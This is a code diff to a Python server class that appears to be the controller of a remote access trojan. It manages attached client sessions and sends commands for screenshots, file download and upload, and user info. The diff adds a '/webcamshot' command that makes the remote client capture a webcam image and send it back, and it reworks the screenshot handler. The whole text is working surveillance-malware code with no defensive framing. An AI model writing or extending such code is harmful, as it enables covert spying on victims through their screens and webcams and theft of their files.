@@ -152,11 +152,32 @@ class Server(object):
                         self.receiveFile(connection, header)
                     else:
                         printr(f'[red]{header["content"]}')
+
                 except EOFError:
                     printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                     self.removecurrentSession() # removing the current session because connection probaly was lost
             else:
                 printr('Info: Download an external file. [green]Ex: /download sóastop.mp3')
+        else:
+            printr('[yellow] No session currently attached.')
+
+    # taking a webcam shot from client side
+    def webcamshot(self, args):
+        self.checkFolders()
+
+        if self.userAttached:
+            connection = self.getCurrentUser()['conn']
+            connection.send(self.lastCommand.encode())
+            try:
+                header = loads(connection.recv(512))
+                if header['sucess']:
+                    self.receiveFile(connection, header)
+                else:
+                    printr(f'[red]{header["content"]}')
+                    
+            except EOFError:
+                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
+                self.removecurrentSession() # removing the current session because connection probaly was lost
         else:
             printr('[yellow] No session currently attached.')
 
@@ -166,7 +187,7 @@ class Server(object):
 
         if self.userAttached:
             connection = self.getCurrentUser()['conn']
-            connection.send('/screenshot'.encode())
+            connection.send(self.lastCommand.encode())
             try:
                 header = loads(connection.recv(512))
                 self.receiveFile(connection, header)
@@ -259,6 +280,7 @@ class Server(object):
             "/userinfo": {"local": True, "action": self.userInfo},
             "/rmsession": {"local": True, "action": self.removeUserSession},
             "/screenshot": {"local": False, "action": self.screenshot},
+            "/webcamshot": {"local": False, "action": self.webcamshot},
             "/download": {"local": False, "action": self.download},
             "/upload": {"local": False, "action": self.upload},
             "/author": {"local": True, "action": self.showCodeAuthor},
